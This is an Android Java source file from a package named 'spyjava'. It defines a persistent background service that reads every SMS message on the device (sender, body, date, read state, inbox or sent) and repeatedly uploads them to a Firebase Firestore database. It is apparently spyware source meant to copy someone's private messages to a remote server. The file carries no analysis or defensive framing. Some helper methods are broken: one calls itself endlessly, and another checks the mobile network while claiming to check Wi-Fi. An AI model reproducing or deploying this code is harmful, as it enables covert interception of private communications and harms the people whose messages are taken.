package com.example.spyjava;

import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.FirebaseFirestore;

public class Myservice extends Service {

    static final String CONNECTIVITY_CHANGE_ACTION = "android.net.conn.CONNECTIVITY_CHANGE";
    NotificationManager manager ;
    FirebaseFirestore db;
    AddR addR;
    Sms objSms;
    Integer delay;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

//    public boolean isConnected() {
//        ConnectivityManager connectivityManager;
//        connectivityManager=(ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
//        NetworkInfo mWifi = connectivityManager.getNetworkInfo(ConnectivityManager.EXTRA_NO_CONNECTIVITY,false);
//        return isConnected();
//    }
//public static boolean isInternetConnected() {
//
//            .getApplicationContext()
//            .getSystemService(Context.CONNECTIVITY_SERVICE);
//    NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
//
//    return networkInfo != null && networkInfo.isConnectedOrConnecting();
//}
public boolean isNetworkConnected(Context context){
    ConnectivityManager connectivity = (ConnectivityManager) context
            .getSystemService(Context.CONNECTIVITY_SERVICE);
      return isNetworkConnected(this);
}

    public Boolean isWifiConnected() {
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mWifi.isConnected();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
             performSync();
            startSyncThread();

        // Let it continue running until it is stopped.
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (CONNECTIVITY_CHANGE_ACTION.equals(action)) {
                    //check internet connection
                    if (!ConnectionHelper.isConnectedOrConnecting(context)) {
                        if (context != null) {
                            boolean show = false;
                            if (ConnectionHelper.lastNoConnectionTs == -1) {//first time
                                show = true;
                                ConnectionHelper.lastNoConnectionTs = System.currentTimeMillis();
                            } else {
                                if (System.currentTimeMillis() - ConnectionHelper.lastNoConnectionTs > 1000) {
                                    show = true;
                                    ConnectionHelper.lastNoConnectionTs = System.currentTimeMillis();
                                }
                            }

                            if (show && ConnectionHelper.isOnline) {
                                ConnectionHelper.isOnline = false;

                                //manager.cancelAll();
                            }
                        }
                    } else {


                        ConnectionHelper.isOnline = true;
                    }
                }
            }
        };
        registerReceiver(receiver,filter);
        return START_STICKY;
    }
    public void startSyncThread() {
        Handler handler = new Handler();
        delay = 1000;

        handler.postDelayed(new Runnable() {
            public void run() {
                UpoadContent();
                handler.postDelayed(this, delay);
            }
        }, delay);
    }

    public void performSync() {
        if (isWifiConnected()) {
            UpoadContent();
            delay = 60000;
        } else {
            Toast.makeText(this, "Failed to upload content due to network", Toast.LENGTH_SHORT).show();
            delay = 10000;
        }

    }
    public void UpoadContent(){


        Context context;
        db=FirebaseFirestore.getInstance();
        String collection;
        Toast.makeText(getApplicationContext(), "Uploading Content!", Toast.LENGTH_SHORT).show();
        Cursor cursor =getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        //noinspection deprecation
        int totalSMS = cursor.getCount();


        if (cursor.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                addR=new AddR();
                objSms.setId(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                objSms.setAddress(cursor.getString(cursor
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(cursor.getString(cursor.getColumnIndexOrThrow("body")));
                objSms.setReadState(cursor.getString(cursor.getColumnIndex("read")));
                objSms.setTime(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    collection="inbox";
                } else {
                    collection="sent";
                }
                addR.setAd(cursor.getString(cursor.getColumnIndexOrThrow("address")));
                objSms.setAddress(cursor.getString(cursor
                        .getColumnIndexOrThrow("address")));
                objSms.set_type(collection);
//                String limo=context.getDeviceName();
                String add=cursor.getString(cursor.getColumnIndexOrThrow("address"));
                db.collection("message")
                        .document(add)
                        .collection("chats")
                        .document(cursor.getString(cursor.getColumnIndexOrThrow("_id")))
                        .set(objSms).addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {

                        Toast.makeText(getApplicationContext(), "DATA UPLOADED", Toast.LENGTH_SHORT).show();
                        db.collection("message").document(add).set(addR);
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Toast.makeText(getApplicationContext(), "FAILED TO UPLOAD DATA", Toast.LENGTH_SHORT).show();
                    }
                });
                cursor.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        cursor.close();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
    }
}